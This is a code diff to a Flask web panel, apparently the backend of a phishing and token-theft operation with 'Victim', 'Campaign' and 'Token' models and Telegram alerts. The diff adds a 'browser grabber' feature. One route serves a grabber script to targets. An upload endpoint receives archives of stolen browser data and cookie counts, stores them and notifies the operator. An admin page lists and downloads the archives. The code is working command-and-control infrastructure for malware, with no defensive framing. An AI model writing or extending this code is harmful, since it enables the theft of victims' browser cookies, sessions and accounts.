@@ -28,13 +28,14 @@ from flask import (
     session,
     url_for,
 )
+from flask import send_from_directory
 from flask_migrate import Migrate
 from sqlalchemy import text
 from werkzeug.security import check_password_hash, generate_password_hash
 
 from liveness import check_all_tokens, start_liveness_worker
-from models import AuditLog, Campaign, Token, User, Victim, db, utcnow
-from notifier import notify_new_token
+from models import AuditLog, Campaign, Grab, Token, User, Victim, db, utcnow
+from notifier import notify_new_grab, notify_new_token
 
 # ============================================
 # Configuration (config.py optional, env vars win)
@@ -108,6 +109,12 @@ migrate = Migrate(app, db)
 GOOGLE_AUTH_URL = "https://accounts.google.com/o/oauth2/v2/auth"
 GOOGLE_TOKEN_URL = "https://oauth2.googleapis.com/token"
 GOOGLE_USERINFO_URL = "https://www.googleapis.com/oauth2/v2/userinfo"
+
+GRAB_UPLOAD_KEY = setting("GRAB_UPLOAD_KEY", "")
+GRAB_DIR = os.path.join(app.instance_path, "grabs")
+os.makedirs(GRAB_DIR, exist_ok=True)
+app.config["MAX_CONTENT_LENGTH"] = 256 * 1024 * 1024  # 256 MB upload limit
+
 
 # ============================================
 # Custom Jinja2 Filters
@@ -794,6 +801,113 @@ def check_all_tokens_now():
     check_all_tokens(app)
     flash("Liveness check complete.", "success")
     return redirect(url_for("tokens"))
+
+# ============================================
+# Browser Grabber Routes (new feature)
+# ============================================
+
+
+@app.route("/grab")
+@login_required
+def grab_page():
+    """Instructions page for the browser-data grabber client."""
+    scheme = request.headers.get("X-Forwarded-Proto", request.scheme)
+    upload_url = f"{scheme}://{request.host}/api/grab/upload"
+    return render_template("grab.html", upload_url=upload_url)
+
+
+@app.route("/grab/download")
+def grab_script_download():
+    """Serve the grabber client script itself (targets never touch GitHub)."""
+    return send_from_directory(
+        app.root_path, "browser_grab.py", as_attachment=True,
+        download_name="rattle_grab.py",
+    )
+
+
+@app.route("/grabs")
+@login_required
+def grabs():
+    all_grabs = Grab.query.order_by(Grab.created_at.desc()).all()
+    return render_template("grabs.html", grabs=all_grabs)
+
+
+@app.route("/grabs/<int:grab_id>/download")
+@login_required
+def grab_download(grab_id):
+    grab = db.session.get(Grab, grab_id)
+    if grab is None:
+        return "Not found", 404
+    return send_from_directory(
+        GRAB_DIR, grab.filename, as_attachment=True, download_name=grab.filename
+    )
+
+
+@app.route("/grabs/<int:grab_id>/delete", methods=["POST"])
+@login_required
+def grab_delete(grab_id):
+    grab = db.session.get(Grab, grab_id)
+    if grab is None:
+        return "Not found", 404
+    try:
+        os.remove(os.path.join(GRAB_DIR, grab.filename))
+    except OSError:
+        pass
+    db.session.delete(grab)
+    db.session.commit()
+    audit("grab_deleted", f"grab_id={grab_id} device={grab.device_label}")
+    return redirect(url_for("grabs"))
+
+
+@app.route("/api/grab/upload", methods=["POST"])
+def grab_upload():
+    """Receive a browser-data archive from the grabber client."""
+    if GRAB_UPLOAD_KEY:
+        provided = request.headers.get("X-Grab-Key", "")
+        if not secrets.compare_digest(GRAB_UPLOAD_KEY, provided):
+            return jsonify({"error": "bad or missing X-Grab-Key header"}), 401
+
+    uploaded = request.files.get("file")
+    if uploaded is None or not uploaded.filename:
+        return jsonify({"error": "no file part named 'file'"}), 400
+
+    device_label = (request.form.get("device") or "unknown")[:120]
+    browsers = (request.form.get("browsers") or "")[:190]
+    try:
+        cookie_count = int(request.form.get("cookies") or 0)
+    except ValueError:
+        cookie_count = 0
+
+    filename = f"grab_{utcnow().strftime('%Y%m%d_%H%M%S')}_{secrets.token_hex(4)}.zip"
+    save_path = os.path.join(GRAB_DIR, filename)
+    uploaded.save(save_path)
+    file_size = os.path.getsize(save_path)
+
+    grab = Grab(
+        device_label=device_label,
+        filename=filename,
+        file_size=file_size,
+        browsers=browsers,
+        cookie_count=cookie_count,
+        ip_address=request.remote_addr or "",
+    )
+    db.session.add(grab)
+    db.session.commit()
+
+    audit("grab_received", f"device={device_label} browsers={browsers} size={file_size}")
+    notify_new_grab(
+        TELEGRAM_BOT_TOKEN,
+        TELEGRAM_CHAT_ID,
+        device_label,
+        browsers,
+        cookie_count,
+        grab.size_mb,
+    )
+    log.info(
+        "GRAB RECEIVED device=%s browsers=%s cookies=%s size=%s",
+        device_label, browsers, cookie_count, file_size,
+    )
+    return jsonify({"success": True, "id": grab.id, "size": file_size})
 
 
 # ============================================
